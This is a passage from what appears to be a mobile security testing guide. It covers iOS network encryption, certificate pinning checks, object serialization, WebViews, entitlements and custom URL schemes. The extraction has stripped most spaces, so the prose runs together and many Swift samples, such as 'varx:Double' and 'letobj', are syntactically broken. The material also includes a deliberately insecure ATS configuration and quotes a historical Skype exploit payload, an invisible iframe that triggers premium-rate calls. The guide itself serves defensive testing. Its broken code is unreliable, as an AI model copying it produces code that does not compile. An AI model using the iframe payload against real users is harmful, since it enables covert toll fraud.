theappusesloworhigh-levelAPIsbutyoucanstilltestfordifferenttrustevaluationscenarios(e.g.“doestheappaccept aself-signedcertificate?”). Dynamic Analysis OurtestapproachistograduallyrelaxsecurityoftheSSLhandshakenegotiationandcheckwhichsecuritymechanisms areenabled. 1. HavingBurpsetupasaproxy,makesurethatthereisnocertificateaddedtothetruststore(Settings->General ->Profiles)andthattoolslikeSSLKillSwitcharedeactivated. Launchyourapplicationandcheckifyoucansee thetrafficinBurp. Anyfailureswillbereportedunder‘Alerts’tab. Ifyoucanseethetraffic,itmeansthatthereis nocertificatevalidationperformedatall. Ifhowever,youcan’tseeanytrafficandyouhaveaninformationabout SSLhandshakefailure,followthenextpoint. 2. Now,installtheBurpcertificate,asexplainedinBurp’suserdocumentation. Ifthehandshakeissuccessfulandyou canseethetrafficinBurp,itmeansthatthecertificateisvalidatedagainstthedevice’struststore,butnopinning isperformed. If executing the instructions from the previous step doesn’t lead to traffic being proxied, it may mean that certificate pinningisactuallyimplementedandallsecuritymeasuresareinplace. However,youstillneedtobypassthepinningin ordertotesttheapplication. Pleaserefertothesection“BypassingCertificatePinning”formoreinformationonthis. Testing Data Encryption on the Network Platform: ios MASVSV1: MSTG-NETWORK-1 MASVSV2: MASVS-NETWORK-1 Overview Allthepresentedcasesmustbecarefullyanalyzedasawhole. Forexample, eveniftheappdoesnotpermitcleartext trafficinitsInfo.plist,itmightactuallystillbesendingHTTPtraffic. Thatcouldbethecaseifit’susingalow-levelAPI(for whichATSisignored)orabadlyconfiguredcross-platformframework. IMPORTANT:Youshouldapplytheseteststotheappmaincodebutalsotoanyappextensions,frameworksorWatch appsembeddedwithintheappaswell. 433\nFormoreinformationrefertothearticle“PreventingInsecureNetworkConnections”and“Fine-tuneyourAppTransport Securitysettings”intheAppleDeveloperDocumentation. Static Analysis Testing Network Requests over Secure Protocols First, you should identify all network requests in the source code and ensure that no plain HTTP URLs are used. Make surethatsensitiveinformationissentoversecurechannelsbyusingURLSession(whichusesthestandardURLLoading SystemfromiOS)orNetwork(forsocket-levelcommunicationusingTLSandaccesstoTCPandUDP). Check for Low-Level Networking API Usage IdentifythenetworkAPIsusedbytheappandseeifitusesanylow-levelnetworkingAPIs. Apple Recommendation: Prefer High-Level Frameworks in Your App: “ATSdoesn’tapplytocallsyourapp makes to lower-level networking interfaces like the Network framework or CFNetwork. In these cases, you take responsibility for ensuring the security of the connection. You can construct a secure connection this way, but mistakes are both easy to make and costly. It’s typically safest to rely on the URL Loading System instead” (see source). Iftheappusesanylow-levelAPIssuchasNetworkorCFNetwork,youshouldcarefullyinvestigateiftheyarebeingused securely. Forappsusingcross-platformframeworks(e.g.Flutter,Xamarin,...)andthirdpartyframeworks(e.g.Alamofire) youshouldanalyzeifthey’rebeingconfiguredandusedsecurelyaccordingtotheirbestpractices. Makesurethattheapp: • verifiesthechallengetypeandthehostnameandcredentialswhenperformingservertrustevaluation. • doesn’tignoreTLSerrors. • doesn’tuseanyinsecureTLSconfigurations(see“TestingtheTLSSettings”) Thesechecksareorientative,wecannotnamespecificAPIssinceeveryappmightuseadifferentframework. Pleaseuse thisinformationasareferencewheninspectingthecode. Testing for Cleartext Traffic EnsurethattheappisnotallowingcleartextHTTPtraffic. SinceiOS9.0cleartextHTTPtrafficisblockedbydefault(due toAppTransportSecurity(ATS))buttherearemultiplewaysinwhichanapplicationcanstillsendit: • Configuring ATS to enable cleartext traffic by setting the NSAllowsArbitraryLoads attribute to true (or YES) on NSAppTransportSecurityintheapp’sInfo.plist. • RetrievetheInfo.plist • CheckthatNSAllowsArbitraryLoadsisnotsettotruegloballyofforanydomain. • If the application opens third party web sites in WebViews, then from iOS 10 onwards NSAllowsArbitraryLoad- sInWebContentcanbeusedtodisableATSrestrictionsforthecontentloadedinwebviews. Apple warns: Disabling ATS means that unsecured HTTP connections are allowed. HTTPS connections are also allowed,andarestillsubjecttodefaultservertrustevaluation. However,extendedsecuritychecks—likerequiring aminimumTransportLayerSecurity(TLS)protocolversion—aredisabled. WithoutATS,you’realsofreetoloosen thedefaultservertrustrequirements,asdescribedin“PerformingManualServerTrustAuthentication”. ThefollowingsnippetshowsavulnerableexampleofanappdisablingATSrestrictionsglobally. <key>NSAppTransportSecurity</key> <dict> <key>NSAllowsArbitraryLoads</key> <true/> </dict> 434\nATS should be examined taking the application’s context into consideration. The application may have to define ATS exceptionstofulfillitsintendedpurpose. Forexample,theFirefoxiOSapplicationhasATSdisabledglobally. Thisexception isacceptablebecauseotherwisetheapplicationwouldnotbeabletoconnecttoanyHTTPwebsitethatdoesnothaveall theATSrequirements. Insomecases,appsmightdisableATSgloballybutenableitforcertaindomainstoe.g.securely loadmetadataorstillallowsecurelogin. ATSshouldincludeajustificationstringforthis(e.g.“Theappmustconnecttoaservermanagedbyanotherentitythat doesn’tsupportsecureconnections.”). Dynamic Analysis Intercept the tested app’s incoming and outgoing network traffic and make sure that this traffic is encrypted. You can interceptnetworktrafficinanyofthefollowingways: • CaptureallHTTP(S)andWebsockettrafficwithaninterceptionproxylikeOWASPZAPorBurpSuiteandmakesure allrequestsaremadeviaHTTPSinsteadofHTTP. • InterceptionproxieslikeBurpandOWASPZAPwillshowHTTP(S)trafficonly. Youcan,however,useaBurpplugin suchasBurp-non-HTTP-Extensionorthetoolmitm-relaytodecodeandvisualizecommunicationviaXMPPandother protocols. SomeapplicationsmaynotworkwithproxieslikeBurpandOWASPZAPbecauseofCertificatePinning. Insucha scenario,pleasecheck“TestingCustomCertificateStoresandCertificatePinning”. Formoredetailsreferto: • “InterceptingTrafficontheNetworkLayer”fromchapter“TestingNetworkCommunication” • “SettingupaNetworkTestingEnvironment”fromchapteriOSBasicSecurityTesting 435\niOS Platform APIs Overview Enforced Updating Enforcedupdatingcanbehelpfulwhenitcomestopublickeypinning(seetheTestingNetworkcommunicationformore details) when a pin has to be refreshed due to a certificate/public key rotation. Additionally, vulnerabilities are easily patchedbymeansofforcedupdates. ThechallengewithiOShowever,isthatAppledoesnotprovideanyAPIsyettoautomatethisprocess,instead,developers will have to create their own mechanism, such as described at various blogs which boil down to looking up properties of the app using http://itunes.apple.com/lookup\?id\<BundleId> or third party libraries, such as Siren and react- native-appstore-version-checker. Most of these implementations will require a certain given version offered by an API or just “latest in the appstore”, which means users can be frustrated with having to update the app, even though no business/securityneedforanupdateistrulythere. Please note that newer versions of an application will not fix security issues that are living in the backends to which the app communicates. Allowing an app not to communicate with it might not be enough. Having proper API-lifecycle managementiskeyhere. Similarly,whenauserisnotforcedtoupdate,donotforgettotestolderversionsofyourapp againstyourAPIand/oruseproperAPIversioning. Object Persistence ThereareseveralwaystopersistanobjectoniOS: Object Encoding iOScomeswithtwoprotocolsforobjectencodinganddecodingforObjective-CorNSObjects: NSCodingandNSSecure- Coding. When a class conforms to either of the protocols, the data is serialized to NSData: a wrapper for byte buffers. NotethatDatainSwiftisthesameasNSDataoritsmutablecounterpart: NSMutableData. TheNSCodingprotocoldeclares the two methods that must be implemented in order to encode/decode its instance-variables. A class using NSCoding needstoimplementNSObjectorbeannotatedasan@objcclass. TheNSCodingprotocolrequirestoimplementencode andinitasshownbelow. class CustomPoint:NSObject,NSCoding { //requiredbyNSCoding: func encode(with aCoder:NSCoder){ aCoder.encode(x,forKey:"x") aCoder.encode(name,forKey:"name") } varx:Double =0.0 varname:String ="" init(x:Double,name:String){ self.x=x self.name =name } //requiredbyNSCoding:initializemembersusingadecoder. required convenience init?(coderaDecoder:NSCoder){ guard letname =aDecoder.decodeObject(forKey:"name")as?String else {return nil} self.init(x:aDecoder.decodeDouble(forKey:"x"), name:name) } //getters/setters/etc. } TheissuewithNSCodingisthattheobjectisoftenalreadyconstructedandinsertedbeforeyoucanevaluatetheclass- type. Thisallowsanattackertoeasilyinjectallsortsofdata. Therefore,theNSSecureCodingprotocolhasbeenintroduced. WhenconformingtoNSSecureCodingyouneedtoinclude: 436\nstatic varsupportsSecureCoding:Bool { return true } wheninit(coder:) ispartoftheclass. Next,whendecodingtheobject,acheckshouldbemade,e.g.: letobj=decoder.decodeObject(of:MyClass.self,forKey:"myKey") The conformance to NSSecureCoding ensures that objects being instantiated are indeed the ones that were expected. However,therearenoadditionalintegritychecksdoneoverthedataandthedataisnotencrypted. Therefore,anysecret dataneedsadditionalencryptionanddataofwhichtheintegritymustbeprotected,shouldgetanadditionalHMAC. Note,whenNSData(Objective-C)orthekeywordlet(Swift)isused: thenthedataisimmutableinmemoryandcannot beeasilyremoved. Object Archiving with NSKeyedArchiver NSKeyedArchiverisaconcretesubclassofNSCoderandprovidesawaytoencodeobjectsandstoretheminafile. The NSKeyedUnarchiverdecodesthedataandrecreatestheoriginaldata. Let’staketheexampleoftheNSCodingsection andnowarchiveandunarchivethem: //archiving: NSKeyedArchiver.archiveRootObject(customPoint,toFile:"/path/to/archive") //unarchiving: guard letcustomPoint =NSKeyedUnarchiver.unarchiveObjectWithFile("/path/to/archive")as? CustomPoint else {return nil} Whendecodingakeyedarchive,becausevaluesarerequestedbyname,valuescanbedecodedoutofsequenceornotat all. Keyedarchives,therefore,providebettersupportforforwardandbackwardcompatibility. Thismeansthatanarchive ondiskcouldactuallycontainadditionaldatawhichisnotdetectedbytheprogram,unlessthekeyforthatgivendatais providedatalaterstage. Note that additional protection needs to be in place to secure the file in case of confidential data, as the data is not encryptedwithinthefile. Seethechapter“DataStorageoniOS”formoredetails. Codable WithSwift 4, the Codable type alias arrived: it is a combination of theDecodable and Encodable protocols. A String, Int,Double,Date,DataandURLareCodablebynature: meaningtheycaneasilybeencodedanddecodedwithoutany additionalwork. Let’stakethefollowingexample: struct CustomPointStruct:Codable { varx:Double varname:String } By adding Codable to the inheritance list for the CustomPointStruct in the example, the methods init(from:) and encode(to:) areautomaticallysupported. ForemoredetailsabouttheworkingsofCodablechecktheAppleDeveloper Documentation. The Codables can easily be encoded / decoded into various representations: NSData using NSCod- ing/NSSecureCoding,JSON,PropertyLists,XML,etc. Seethesubsectionsbelowformoredetails. JSON and Codable TherearevariouswaystoencodeanddecodeJSONwithiniOSbyusingdifferent3rdpartylibraries: • Mantle • JSONModellibrary • SwiftyJSONlibrary • ObjectMapperlibrary 437\n• JSONKit • JSONModel • YYModel • SBJson5 • Unbox • Gloss • Mapper • JASON • Arrow ThelibrariesdifferintheirsupportforcertainversionsofSwiftandObjective-C,whethertheyreturn(im)mutableresults, speed,memoryconsumptionandactuallibrarysize. Again,noteincaseofimmutability: confidentialinformationcannot beremovedfrommemoryeasily. Next, Apple provides support for JSON encoding/decoding directly by combining Codable together with a JSONEncoder andaJSONDecoder: struct CustomPointStruct:Codable { varpoint:Double varname:String } letencoder =JSONEncoder() encoder.outputFormatting =.prettyPrinted lettest =CustomPointStruct(point:10,name:"test") letdata =tryencoder.encode(test) letstringData =String(data:data,encoding:.utf8) //stringData=Optional({ //"point":10, //"name":"test" //}) JSON itself can be stored anywhere, e.g., a (NoSQL) database or a file. You just need to make sure that any JSON that containssecretshasbeenappropriatelyprotected(e.g.,encrypted/HMACed). Seethechapter“DataStorageoniOS”for moredetails. Property Lists and Codable Youcanpersistobjectstopropertylists(alsocalledplistsinprevioussections). Youcanfindtwoexamplesbelowofhow touseit: //archiving: letdata =NSKeyedArchiver.archivedDataWithRootObject(customPoint) NSUserDefaults.standardUserDefaults().setObject(data,forKey:"customPoint") //unarchiving: ifletdata =NSUserDefaults.standardUserDefaults().objectForKey("customPoint")as?NSData { letcustomPoint =NSKeyedUnarchiver.unarchiveObjectWithData(data) } In this first example, the NSUserDefaults are used, which is the primary property list. We can do the same with the Codableversion: struct CustomPointStruct:Codable { varpoint:Double varname:String } varpoints:[CustomPointStruct]=[ CustomPointStruct(point:1,name:"test"), CustomPointStruct(point:2,name:"test"), CustomPointStruct(point:3,name:"test"), ] UserDefaults.standard.set(try?PropertyListEncoder().encode(points),forKey:"points") ifletdata =UserDefaults.standard.value(forKey:"points")as?Data { letpoints2 =try?PropertyListDecoder().decode([CustomPointStruct].self,from:data) } 438\nNotethatplistfilesarenotmeanttostoresecretinformation. Theyaredesignedtoholduserpreferencesforan app. XML TherearemultiplewaystodoXMLencoding. SimilartoJSONparsing,therearevariousthirdpartylibraries,suchas: • Fuzi • Ono • AEXML • RaptureXML • SwiftyXMLParser • SWXMLHash They vary in terms of speed, memory usage, object persistence and more important: differ in how they handle XML external entities. See XXE in the Apple iOS Office viewer as an example. Therefore, it is key to disable external entity parsingifpossible. SeetheOWASPXXEpreventioncheatsheetformoredetails. Nexttothelibraries,youcanmakeuse ofApple’sXMLParserclass When not using third party libraries, but Apple’s XMLParser, be sure to let shouldResolveExternalEntities return false. Object-Relational Mapping (CoreData and Realm) TherearevariousORM-likesolutionsforiOS.ThefirstoneisRealm,whichcomeswithitsownstorageengine. Realmhas settingstoencryptthedataasexplainedinRealm’sdocumentation. Thisallowsforhandlingsecuredata. Notethatthe encryptionisturnedoffbydefault. AppleitselfsuppliesCoreData,whichiswellexplainedintheAppleDeveloperDocumentation. Itsupportsvariousstorage backendsasdescribedinApple’sPersistentStoreTypesandBehaviorsdocumentation. Theissuewiththestorageback- endsrecommendedbyApple, isthatnoneofthetypeofdatastoresisencrypted, norcheckedforintegrity. Therefore, additional actions are necessary in case of confidential data. An alternative can be found in project iMas, which does supplyoutoftheboxencryption. Protocol Buffers ProtocolBuffersbyGoogle,areaplatform-andlanguage-neutralmechanismforserializingstructureddatabymeansof theBinaryDataFormat. TheyareavailableforiOSbymeansoftheProtobuflibrary. Therehavebeenafewvulnerabil- itieswithProtocolBuffers, suchasCVE-2015-5237. NotethatProtocol Buffers do not provide any protection for confidentialityasnobuilt-inencryptionisavailable. WebViews WebViews are in-app browser components for displaying interactive web content. They can be used to embed web content directly into an app’s user interface. iOS WebViews support JavaScript execution by default, so script injection andCross-SiteScriptingattackscanaffectthem. Types of WebViews TherearemultiplewaystoincludeaWebViewinaniOSapplication: • UIWebView • WKWebView • SFSafariViewController UIWebView UIWebViewisdeprecatedstartingoniOS12andshouldnotbeused. MakesurethateitherWKWebVieworSFSafariView- Controllerareusedtoembedwebcontent. Inadditiontothat, JavaScriptcannotbedisabledforUIWebViewwhichis anotherreasontorefrainfromusingit. 439\nWKWebView WKWebViewwasintroducedwithiOS8andistheappropriatechoiceforextendingappfunctionality,controllingdisplayed content(i.e.,preventtheuserfromnavigatingtoarbitraryURLs)andcustomizing. WKWebViewcomeswithseveralsecurityadvantagesoverUIWebView: • JavaScriptisenabledbydefaultbutthankstothejavaScriptEnabledpropertyofWKWebView,itcanbecompletely disabled,preventingallscriptinjectionflaws. • The JavaScriptCanOpenWindowsAutomatically can be used to prevent JavaScript from opening new windows, suchaspop-ups. • ThehasOnlySecureContentpropertycanbeusedtoverifyresourcesloadedbytheWebViewareretrievedthrough encryptedconnections. • WKWebViewimplementsout-of-processrendering,somemorycorruptionbugswon’taffectthemainappprocess. A JavaScript Bridge can be enabled when using WKWebView and UIWebView. See Section “Native Functionality Exposed ThroughWebViews”belowformoreinformation. SFSafariViewController SFSafariViewControllerisavailablestartingoniOS9andshouldbeusedtoprovideageneralizedwebviewingexperi- ence. TheseWebViewscanbeeasilyspottedastheyhaveacharacteristiclayoutwhichincludesthefollowingelements: • Aread-onlyaddressfieldwithasecurityindicator. • AnAction(“Share”)button. • ADonebutton,backandforwardnavigationbuttons,anda“Safari”buttontoopenthepagedirectlyinSafari. 440\nThereareacoupleofthingstoconsider: • JavaScriptcannotbedisabledinSFSafariViewControllerandthisisoneofthereasonswhytheusageofWKWeb- Viewisrecommendedwhenthegoalisextendingtheapp’suserinterface. • SFSafariViewControlleralsosharescookiesandotherwebsitedatawithSafari. • Theuser’sactivityandinteractionwithaSFSafariViewControllerarenotvisibletotheapp,whichcannotaccess AutoFilldata,browsinghistory,orwebsitedata. • AccordingtotheAppStoreReviewGuidelines,SFSafariViewControllersmaynotbehiddenorobscuredbyother viewsorlayers. Thisshouldbesufficientforanappanalysisandtherefore,SFSafariViewControllersareoutofscopefortheStaticand DynamicAnalysissections. Safari Web Inspector EnablingSafariwebinspectiononiOSallowsyoutoinspectthecontentsofaWebViewremotelyfromamacOSdevice. Bydefault,youcanviewthecontentsofanypageloadedintotheSafariappbecausetheSafariapphastheget-task- 441\nallowedentitlement. ApplicationsinstalledfromtheAppstorewillhowevernothavethisentitlement,andsocannotbe attachedto. Onjailbrokendevices,thisentitlementcanbeaddedtoanyapplicationbyinstallingtheInspectorplustweak fromtheBigBossrepo. EnablingtheSafariWebInspectorisespeciallyinterestinginapplicationsthatexposenativeAPIsusingaJavaScriptbridge, forexampleinhybridapplications. Toactivatethewebinspectionyouhavetofollowthesesteps: 1. OntheiOSdeviceopentheSettingsapp: GotoSafari->AdvancedandtoggleonWebInspector. 2. OnthemacOSdevice,openSafari: inthemenubar,gotoSafari->Preferences->AdvancedandenableShow Developmenuinmenubar. 3. Connect your iOS device to the macOS device and unlock it: the iOS device name should appear in theDevelop menu. 4. (If not yet trusted) On macOS’s Safari, go to the Develop menu, click on the iOS device name, then on “Use for Development”andenabletrust. ToopenthewebinspectoranddebugaWebView: 1. IniOS,opentheappandnavigatetothescreenthatshouldcontainaWebView. 2. InmacOSSafari, gotoDeveloper -> ‘iOS Device Name’andyoushouldseethenameoftheWebViewbased context. ClickonittoopentheWebInspector. Nowyou’reabletodebugtheWebViewasyouwouldwitharegularwebpageonyourdesktopbrowser. Native Functionality Exposed Through WebViews IniOS7,AppleintroducedAPIsthatallowcommunicationbetweentheJavaScriptruntimeintheWebViewandthenative SwiftorObjective-Cobjects. IftheseAPIsareusedcarelessly,importantfunctionalitymightbeexposedtoattackerswho managetoinjectmaliciousscriptsintotheWebView(e.g.,throughasuccessfulCross-SiteScriptingattack). BothUIWebViewandWKWebViewprovideameansofcommunicationbetweentheWebViewandthenativeapp. Anyimpor- tantdataornativefunctionalityexposedtotheWebViewJavaScriptenginewouldalsobeaccessibletorogueJavaScript runningintheWebView. UIWebView: TherearetwofundamentalwaysofhownativecodeandJavaScriptcancommunicate: • JSContext: WhenanObjective-CorSwiftblockisassignedtoanidentifierinaJSContext,JavaScriptCoreautomat- icallywrapstheblockinaJavaScriptfunction. • JSExport protocol: Properties, instance methods and class methods declared in a JSExport-inherited protocol aremappedtoJavaScriptobjectsthatareavailabletoallJavaScriptcode. Modificationsofobjectsthatareinthe JavaScriptenvironmentarereflectedinthenativeenvironment. NotethatonlyclassmembersdefinedintheJSExportprotocolaremadeaccessibletoJavaScriptcode. WKWebView: JavaScript code in a WKWebView can still send messages back to the native app but in contrast to UIWebView, it is not possibletodirectlyreferencetheJSContextofaWKWebView. Instead,communicationisimplementedusingamessaging systemandusingthepostMessagefunction,whichautomaticallyserializesJavaScriptobjectsintonativeObjective-Cor Swiftobjects. Messagehandlersareconfiguredusingthemethodadd(_ scriptMessageHandler:name:). App Permissions IncontrasttoAndroid,whereeachapprunsonitsownuserID,iOSmakesallthird-partyappsrununderthenon-privileged mobile user. Each app has a unique home directory and is sandboxed, so that they cannot access protected system resourcesorfilesstoredbythesystemorbyotherapps. Theserestrictionsareimplementedviasandboxpolicies(aka. profiles),whichareenforcedbytheTrustedBSD(MAC)MandatoryAccessControlFrameworkviaakernelextension. iOS applies a generic sandbox profile to all third-party apps called container. Access to protected resources or data (some alsoknownasappcapabilities)ispossible,butit’sstrictlycontrolledviaspecialpermissionsknownasentitlements. 442\nSomepermissionscanbeconfiguredbytheapp’sdevelopers(e.g.DataProtectionorKeychainSharing)andwilldirectly takeeffectaftertheinstallation. However,forothers,theuserwillbeexplicitlyaskedthefirsttimetheappattemptsto accessaprotectedresource,forexample: • Bluetoothperipherals • Calendardata • Camera • Contacts • Healthsharing • Healthupdating • HomeKit • Location • Microphone • Motion • Musicandthemedialibrary • Photos • Reminders • Siri • Speechrecognition • theTVprovider EventhoughAppleurgestoprotecttheprivacyoftheuserandtobeveryclearonhowtoaskpermissions,itcanstillbe thecasethatanapprequeststoomanyofthemfornon-obviousreasons. VerifyingtheuseofsomepermissionssuchasCamera,Photos,CalendarData,Motion,ContactsorSpeechRecognition should be pretty straightforward as it should be obvious if the app requires them to fulfill its tasks. Let’s consider the following examples regarding the Photos permission, which, if granted, gives the app access to all user photos in the “CameraRoll”(theiOSdefaultsystem-widelocationforstoringphotos): • ThetypicalQRCodescanningappobviouslyrequiresthecameratofunctionbutmightberequestingthephotos permission as well. If storage is explicitly required, and depending on the sensitivity of the pictures being taken, theseappsmightbetteropttousetheappsandboxstoragetoavoidotherapps(havingthephotospermission)to accessthem. Seethechapter“DataStorageoniOS”formoreinformationregardingstorageofsensitivedata. • Some apps require photo uploads (e.g. for profile pictures). Recent versions of iOS introduce new APIs such as UIImagePickerController (iOS 11+) and its modern replacement PHPickerViewController (iOS 14+). These APIs run on a separate process from your app and by using them, the app gets read-only access exclusively to theimagesselectedbytheuserinsteadoftothewhole“CameraRoll”. Thisisconsideredabestpracticetoavoid requestingunnecessarypermissions. VerifyingotherpermissionslikeBluetoothorLocationrequireadeepersourcecodeinspection. Theymayberequiredfor theapptoproperlyfunctionbutthedatabeinghandledbythosetasksmightnotbeproperlyprotected. Whencollectingorsimplyhandling(e.g.caching)sensitivedata,anappshouldprovidepropermechanismstogivethe usercontroloverit,e.g.tobeabletorevokeaccessortodeleteit. However,sensitivedatamightnotonlybestoredor cachedbutalsosentoverthenetwork. Inbothcases,ithastobeensuredthattheappproperlyfollowstheappropriate bestpractices,whichinthiscaseinvolveimplementingproperdataprotectionandtransportsecurity. Moreinformation onhowtoprotectthiskindofdatacanbefoundinthechapter“NetworkAPIs”. Asyoucansee,usingappcapabilitiesandpermissionsmostlyinvolvehandlingpersonaldata,thereforebeingamatter ofprotectingtheuser’sprivacy. Seethearticles“ProtectingtheUser’sPrivacy”and“AccessingProtectedResources”in AppleDeveloperDocumentationformoredetails. Device Capabilities DevicecapabilitiesareusedbytheAppStoretoensurethatonlycompatibledevicesarelistedandthereforeareallowed todownloadtheapp. TheyarespecifiedintheInfo.plistfileoftheappundertheUIRequiredDeviceCapabilities key. <key>UIRequiredDeviceCapabilities</key> <array> <string>arm64</string> </array> 443\nTypicallyyou’llfindthearm64capability,meaningthattheappiscompiledforthearm64instructionset. For example, an app might be completely dependent on NFC to work (e.g. a “NFC Tag Reader” app). According to the archived iOS Device Compatibility Reference, NFC is only available starting on the iPhone 7 (and iOS 11). A developer mightwanttoexcludeallincompatibledevicesbysettingthenfcdevicecapability. Regarding testing, you can consider UIRequiredDeviceCapabilities as a mere indication that the app is using some specific resources. Unlike the entitlements related to app capabilities, device capabilities do not confer any right or accesstoprotectedresources. Additionalconfigurationstepsmightberequiredforthat,whichareveryspecifictoeach capability. Forexample,ifBLEisacorefeatureoftheapp,Apple’sCoreBluetoothProgrammingGuideexplainsthedifferentthings tobeconsidered: • Thebluetooth-ledevicecapabilitycanbesetinordertorestrictnon-BLEcapabledevicesfromdownloadingtheir app. • Appcapabilitieslikebluetooth-peripheralorbluetooth-central(bothUIBackgroundModes)shouldbeaddedif BLEbackgroundprocessingisrequired. However, this is not yet enough for the app to get access to the Bluetooth peripheral, the NSBluetoothPeripher- alUsageDescriptionkeyhastobeincludedintheInfo.plistfile,meaningthattheuserhastoactivelygivepermission. See“PurposeStringsintheInfo.plistFile”belowformoreinformation. Entitlements AccordingtoApple’siOSSecurityGuide: Entitlementsarekeyvaluepairsthataresignedintoanappandallowauthenticationbeyondruntimefactors,like UNIXuserID.Sinceentitlementsaredigitallysigned,theycan’tbechanged. Entitlementsareusedextensivelyby systemappsanddaemonstoperformspecificprivilegedoperationsthatwouldotherwiserequiretheprocesstorun asroot. Thisgreatlyreducesthepotentialforprivilegeescalationbyacompromisedsystemappordaemon. Manyentitlementscanbesetusingthe“Summary”taboftheXcodetargeteditor. Otherentitlementsrequireeditinga target’sentitlementspropertylistfileorareinheritedfromtheiOSprovisioningprofileusedtoruntheapp. EntitlementSources: 1. Entitlementsembeddedinaprovisioningprofilethatisusedtocodesigntheapp,whicharecomposedof: • CapabilitiesdefinedontheXcodeproject’stargetCapabilitiestab,and/or: • EnabledServicesontheapp’sAppIDwhichareconfiguredontheIdentifierssectionoftheCertificates,ID’s andProfileswebsite. • Otherentitlementsthatareinjectedbytheprofilegenerationservice. 2. Entitlementsfromacodesigningentitlementsfile. EntitlementDestinations: 1. Theapp’ssignature. 2. Theapp’sembeddedprovisioningprofile. TheAppleDeveloperDocumentationalsoexplains: • Duringcodesigning,theentitlementscorrespondingtotheapp’senabledCapabilities/Servicesaretransferredto theapp’ssignaturefromtheprovisioningprofileXcodechosetosigntheapp. • Theprovisioningprofileisembeddedintotheappbundleduringthebuild(embedded.mobileprovision). • Entitlements from the “Code Signing Entitlements” section in Xcode’s “Build Settings” tab are transferred to the app’ssignature. Forexample, ifyouwanttosetthe“DefaultDataProtection”capability, youwouldneedtogototheCapabilitiestab in Xcode and enable Data Protection. This is directly written by Xcode to the <appname>.entitlements file as the com.apple.developer.default-data-protection entitlement with default value NSFileProtectionComplete. In the IPAwemightfindthisintheembedded.mobileprovisionas: 444\n<key>Entitlements</key> <dict> ... <key>com.apple.developer.default-data-protection</key> <string>NSFileProtectionComplete</string> </dict> For other capabilities such as HealthKit, the user has to be asked for permission, therefore it is not enough to add the entitlements,specialkeysandstringshavetobeaddedtotheInfo.plistfileoftheapp. Purpose Strings in the Info.plist File Purposestringsor_usagedescriptionstrings_arecustomtextsthatareofferedtousersinthesystem’spermissionrequest alertwhenrequestingpermissiontoaccessprotecteddataorresources. IflinkingonorafteriOS10,developersarerequiredtoincludepurposestringsintheirapp’sInfo.plistfile. Otherwise, iftheappattemptstoaccessprotecteddataorresourceswithouthavingprovidedthecorrespondingpurposestring,the accesswillfailandtheappmightevencrash. For an overview of the different purpose strings Info.plist keys available see Table 1-2 at the Apple App Programming GuideforiOS.ClickontheprovidedlinkstoseethefulldescriptionofeachkeyintheCocoaKeysreference. Code Signing Entitlements File Certaincapabilitiesrequireacodesigningentitlementsfile(<appname>.entitlements). Itisautomaticallygeneratedby Xcodebutmaybemanuallyeditedand/orextendedbythedeveloperaswell. Here is an example of entitlements file of the open source app Telegram including the App Groups entitlement (application-groups): <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE plist PUBLIC"-//Apple//DTDPLIST1.0//EN""http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0"> <dict> ... <key>com.apple.security.application-groups</key> <array> <string>group.ph.telegra.Telegraph</string> </array> </dict> ... </plist> Theentitlementoutlinedabovedoesnotrequireanyadditionalpermissionsfromtheuser. However,itisalwaysagood practicetocheckallentitlements,astheappmightoverasktheuserintermsofpermissionsandtherebyleakinforma- tion. 445\nAsdocumentedatAppleDeveloperDocumentation,theAppGroupsentitlementisrequiredtoshareinformationbetween differentappsthroughIPCorasharedfilecontainer,whichmeansthatdatacanbesharedonthedevicedirectlybetween theapps. Thisentitlementisalsorequiredifanappextensionrequirestoshareinformationwithitscontainingapp. Depending on the data to-be-shared it might be more appropriate to share it using another method such as through a backendwherethisdatacouldbepotentiallyverified,avoidingtamperingbye.g.theuserthemselves. Inter-Process Communication (IPC) Duringimplementationofamobileapplication,developersmayapplytraditionaltechniquesforIPC(suchasusingshared filesornetworksockets). TheIPCsystemfunctionalityofferedbymobileapplicationplatformsshouldbeusedbecauseitis muchmorematurethantraditionaltechniques. UsingIPCmechanismswithnosecurityinmindmaycausetheapplication toleakorexposesensitivedata. In contrast to Android’s rich Inter-Process Communication (IPC) capability, iOS offers some rather limited options for communicationbetweenapps. Infact, there’snowayforappstocommunicatedirectly. Inthissectionwewillpresent thedifferenttypesofindirectcommunicationofferedbyiOSandhowtotestthem. Here’sanoverview: • CustomURLSchemes • UniversalLinks • UIActivitySharing • AppExtensions • UIPasteboard Custom URL Schemes CustomURLschemesallowappstocommunicateviaacustomprotocol. Anappmustdeclaresupportfortheschemes andhandleincomingURLsthatusethoseschemes. ApplewarnsabouttheimproperuseofcustomURLschemesintheAppleDeveloperDocumentation: URLschemesofferapotentialattackvectorintoyourapp,somakesuretovalidateallURLparametersanddiscard anymalformedURLs. Inaddition,limittheavailableactionstothosethatdonotrisktheuser’sdata. Forexample, donotallowotherappstodirectlydeletecontentoraccesssensitiveinformationabouttheuser. Whentestingyour URL-handlingcode,makesureyourtestcasesincludeimproperlyformattedURLs. Theyalsosuggestusinguniversallinksinstead,ifthepurposeistoimplementdeeplinking: WhilecustomURLschemesareanacceptableformofdeeplinking,universallinksarestronglyrecommendedasa bestpractice. SupportingacustomURLschemeisdoneby: • definingtheformatfortheapp’sURLs, • registeringtheschemesothatthesystemdirectsappropriateURLstotheapp, • handlingtheURLsthattheappreceives. SecurityissuesarisewhenanappprocessescallstoitsURLschemewithoutproperlyvalidatingtheURLanditsparameters andwhenusersaren’tpromptedforconfirmationbeforetriggeringanimportantaction. OneexampleisthefollowingbugintheSkypeMobileapp, discoveredin2010: TheSkypeappregisteredtheskype:/ / protocol handler, which allowed other apps to trigger calls to other Skype users and phone numbers. Unfortunately, Skypedidn’taskusersforpermissionbeforeplacingthecalls,soanyappcouldcallarbitrarynumberswithouttheuser’s knowledge. Attackersexploitedthisvulnerabilitybyputtinganinvisible<iframe src="skype://xxx?call"></iframe> (wherexxxwasreplacedbyapremiumnumber),soanySkypeuserwhoinadvertentlyvisitedamaliciouswebsitecalled thepremiumnumber. As a developer, you should carefully validate any URL before calling it. You can allow only certain applications which maybeopenedviatheregisteredprotocolhandler. PromptinguserstoconfirmtheURL-invokedactionisanotherhelpful control. AllURLsarepassedtotheappdelegate,eitheratlaunchtimeorwhiletheappisrunningorinthebackground. Tohandle incomingURLs,thedelegateshouldimplementmethodsto: 446\n• retrieveinformationabouttheURLanddecidewhetheryouwanttoopenit, • 